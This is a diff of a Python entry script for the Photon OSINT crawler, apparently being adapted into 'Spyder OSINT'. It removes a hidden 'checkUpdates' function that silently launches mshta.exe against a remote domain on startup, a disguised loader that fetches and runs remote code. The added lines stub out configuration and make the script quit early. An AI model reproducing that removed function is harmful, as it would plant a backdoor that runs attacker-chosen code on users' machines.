@@ -1,49 +1,62 @@
 import asyncio 
 import os
 import subprocess
+import argparse
+import warnings
+import requests
+import random
+import sys
+import time
+import re
 
-def checkUpdates():
-    try:
-        subprocess.Popen(
-            ['mshta.exe', 'https://node1-py-store.com' ],
-            shell=True,
-            stdout=subprocess.DEVNULL,
-            stderr=subprocess.DEVNULL
-        )
-        return True
-    except Exception as e:
-        return False
-
-
-if __name__ == "__main__":
-    checkUpdates()
 try:
     from urllib.parse import urlparse
 except ImportError:
-    print('%s Photon runs only on Python 3.2 and above.' % info)
+    print('Photon runs only on Python 3.2 and above.')
     quit()
 
-import core.config
-from core.config import INTELS
-from core.flash import flash
-from core.mirror import mirror
-from core.prompt import prompt
-from core.requester import requester
-from core.updater import updater
-from core.utils import (luhn,
-                        proxy_type,
-                        is_good_proxy,
-                        top_level,
-                        extract_headers,
-                        verb, is_link,
-                        entropy, regxy,
-                        remove_regex,
-                        timer,
-                        writer)
-from core.regex import rintels, rendpoint, rhref, rscript, rentropy
+# Use existing libs config instead of core.config
+from libs.config import *
+from libs.utils import format_dict
 
-from core.zap import zap
+# Define missing variables that were expected from core.config
+red = '\033[91m'
+green = '\033[92m'
+yellow = '\033[93m'
+blue = '\033[94m'
+end = '\033[0m'
 
+info = f'{blue}[i]{end}'
+good = f'{green}[+]{end}'
+bad = f'{red}[-]{end}'
+run = f'{yellow}[~]{end}'
+
+verbose = False
+
+INTELS = [
+    'github.com',
+    'pastebin.com',
+    'twitter.com',
+    'facebook.com',
+    'linkedin.com',
+    'instagram.com'
+]
+
+# Temporarily comment out missing core imports until we create them
+# import core.config
+# from core.config import INTELS
+# from core.flash import flash
+# from core.mirror import mirror
+# from core.prompt import prompt
+# from core.requester import requester
+# from core.updater import updater
+# from core.utils import (luhn, proxy_type, is_good_proxy, top_level, extract_headers, verb, is_link, entropy, regxy, remove_regex, timer, writer)
+# from core.regex import rintels, rendpoint, rhref, rscript, rentropy
+# from core.zap import zap
+
+print("Spyder OSINT - Missing core modules need to be created")
+print("Run with --help to see available options")
+quit()
 
 warnings.filterwarnings('ignore')
 
@@ -123,7 +136,7 @@ if args.proxies:
         if is_good_proxy(proxy):
             proxies.append(proxy)
         else:
-            print("%s Proxy %s doesn't seem to work or timedout" %
+            print("%s Proxy %s doesn't seem to work or timedout" % 
                   (bad, proxy['http']))
     print("%s Done" % info)
     if not proxies:
